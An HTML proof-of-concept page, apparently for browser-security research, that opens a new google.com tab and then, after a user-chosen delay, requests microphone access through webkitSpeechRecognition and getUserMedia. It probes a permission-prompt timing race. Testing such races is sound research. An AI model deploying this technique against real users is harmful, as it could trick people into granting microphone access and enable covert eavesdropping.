<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>window.open Permission Race Tester</title>
  <style>
    body { font-family: sans-serif; padding: 20px; }
    label { display: block; margin-top: 10px; }
    button { margin-top: 15px; padding: 8px 14px; }
    small { color: #555; }
  </style>
</head>
<body>

<h3>window.open Permission Race Tester</h3>

<label>
  Pilih timeout (ms):
  <select id="delaySelect">
    <option value="0">0 ms (event-loop edge)</option>
    <option value="1">1 ms</option>
    <option value="50">50 ms</option>
    <option value="100" selected>100 ms</option>
    <option value="300">300 ms</option>
    <option value="500">500 ms</option>
  </select>
</label>

<label>
  Atau timeout manual (ms):
  <input type="number" id="delayInput" placeholder="contoh: 75">
</label>

<button onclick="start()">Click to Start Test</button>

<small>
  <br>Target: tab/jendela baru terbuka dulu, lalu permission request masuk.
</small>

<script>
function getDelay() {
  const manual = document.getElementById("delayInput").value;
  if (manual !== "" && !isNaN(manual)) {
    return parseInt(manual, 10);
  }
  return parseInt(document.getElementById("delaySelect").value, 10);
}

function start() {
  const delay = getDelay();
  console.log("Using delay:", delay, "ms");

  // Siapkan object saat user gesture
  let recognition = new webkitSpeechRecognition();

  // Buka tab/jendela baru lebih dulu (harus dalam user gesture)
  let w = window.open("https://www.google.com", "_blank");

  // Permission request ditunda sesuai pilihan user
  setTimeout(() => {
    console.log("Requesting microphone permission after window.open");
    try {
      recognition.start();
      navigator.webkitGetUserMedia(
        { audio: true },
        () => console.log("getUserMedia success"),
        (e) => console.log("getUserMedia error", e)
      );
    } catch (e) {
      console.log("Exception:", e);
    }
  }, delay);
}
</script>

</body>
</html>
